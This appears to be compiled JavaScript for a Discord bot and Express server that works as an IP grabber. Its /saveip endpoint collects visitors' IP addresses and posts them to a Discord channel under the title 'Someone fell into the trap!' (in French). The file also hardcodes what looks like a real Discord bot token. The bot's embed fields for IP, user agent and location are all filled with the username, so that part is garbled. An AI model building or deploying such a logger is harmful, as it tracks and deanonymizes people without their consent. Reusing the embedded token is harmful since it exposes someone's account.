"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const rest_1 = require("@discordjs/rest");
const ws_1 = require("@discordjs/ws");
const core_1 = require("@discordjs/core");
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const token = "MTEyOTA3NDY1NzU5Nzg3MDIwMg.GbSQdh.XJbKdQBWNUTkwkCmtlqotJ7ZotfVSGWpKh16Kk";
// Create REST and WebSocket managers directly
const rest = new rest_1.REST({ version: "10" }).setToken(token);
const gateway = new ws_1.WebSocketManager({
    token,
    intents: core_1.GatewayIntentBits.GuildMessages | core_1.GatewayIntentBits.MessageContent,
    rest,
});
// Create a client to emit relevant events.
const client = new core_1.Client({ rest, gateway });
const channelAPI = new core_1.ChannelsAPI(rest);
// Listen for interactions
// Each event contains an `api` prop along with the event data that allows you to interface with the Discord REST API
client.on(core_1.GatewayDispatchEvents.InteractionCreate, ({ data: interaction, api }) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b, _c, _d;
    if (interaction.type !== core_1.InteractionType.ApplicationCommand) {
        return;
    }
    switch (interaction.data.name) {
        case "ping": {
            if (!interaction.member) {
                return;
            }
            yield api.interactions.reply(interaction.id, interaction.token, {
                embeds: [
                    {
                        title: "Quelqu'un est tombé dans le piège !",
                        thumbnail: {
                            url: `https://cdn.discordapp.com/avatars/${interaction.member.user.id}/${interaction.member.user.avatar}.png`,
                        },
                        fields: [
                            {
                                name: "Discord tag",
                                value: `<@${interaction.member.user.id}>`,
                                inline: true,
                            },
                            {
                                name: "Username",
                                value: (_a = interaction.member.user.username) !== null && _a !== void 0 ? _a : "Aucun",
                                inline: true,
                            },
                            {
                                name: "IP Address",
                                value: (_b = interaction.member.user.username) !== null && _b !== void 0 ? _b : "Aucun",
                                inline: true,
                            },
                            {
                                name: "User Agent",
                                value: (_c = interaction.member.user.username) !== null && _c !== void 0 ? _c : "Aucun",
                                inline: true,
                            },
                            {
                                name: "Aproximative location",
                                value: (_d = interaction.member.user.username) !== null && _d !== void 0 ? _d : "Aucun",
                                inline: true,
                            },
                        ],
                    },
                ],
            });
            break;
        }
    }
}));
// API
const app = (0, express_1.default)();
const port = 80;
app.use(express_1.default.json());
app.use(express_1.default.urlencoded({ extended: true }));
app.use((0, cors_1.default)());
app.post("/saveip", (req, res) => {
    const ip = req.body.ip;
    console.log(ip);
    if (!ip) {
        return res.sendStatus(400);
    }
    channelAPI.createMessage("1129100204436627496", {
        embeds: [
            {
                title: "Quelqu'un est tombé dans le piège !",
                fields: [
                    {
                        name: "IP Address",
                        value: ip,
                        inline: true,
                    },
                ],
            },
        ],
    });
    res.sendStatus(200);
});
app.listen(port, () => {
    console.log(`HTTP API Ready at http://localhost:${port}`);
});
// Listen for the ready event
client.once(core_1.GatewayDispatchEvents.Ready, () => console.log("Discord bot Ready!"));
// Start the WebSocket connection.
gateway.connect();
